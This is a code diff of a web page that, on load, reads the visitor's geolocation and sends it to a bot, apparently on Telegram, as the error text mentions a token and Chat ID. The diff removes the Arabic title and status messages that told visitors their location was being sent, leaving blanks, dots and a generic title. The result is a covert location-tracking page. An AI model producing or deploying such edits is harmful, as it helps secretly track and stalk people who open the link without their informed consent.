@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>إرسال الموقع تلقائيًا للبوت</title>
+<title>WEB</title>
 <style>
 body{font-family:Tahoma, Arial;background:#f3f6ff;height:100vh;margin:0;display:flex;align-items:center;justify-content:center;text-align:center}
 #status{margin-top:10px;color:#333}
@@ -12,9 +12,9 @@ body{font-family:Tahoma, Arial;background:#f3f6ff;height:100vh;margin:0;display:
 <body>
 
 <div id="msg">
-<h3>تحديد الموقع تلقائيًا</h3>
-<p id="status">جارٍ تحديد موقعك...</p>
-<small>اللهم صل وسلم على نبينا محمد ﷺ</small>
+<h3></h3>
+<p id="status"></p>
+<small></small>
 </div>
 
 <script>
@@ -29,7 +29,7 @@ window.addEventListener("load", ()=>{
     return;
   }
 
-  statusEl.textContent = "جارٍ تحديد الموقع...";
+  statusEl.textContent = "...";
 
   navigator.geolocation.getCurrentPosition(async(position)=>{
     const lat = position.coords.latitude;
@@ -49,7 +49,7 @@ window.addEventListener("load", ()=>{
       });
 
       if(resp.ok){
-        statusEl.textContent = "✅ تم إرسال موقعك للبوت بنجاح.";
+        statusEl.textContent = ".";
       }else{
         statusEl.textContent = "❌ فشل الإرسال. تحقق من التوكن والـ Chat ID.";
       }
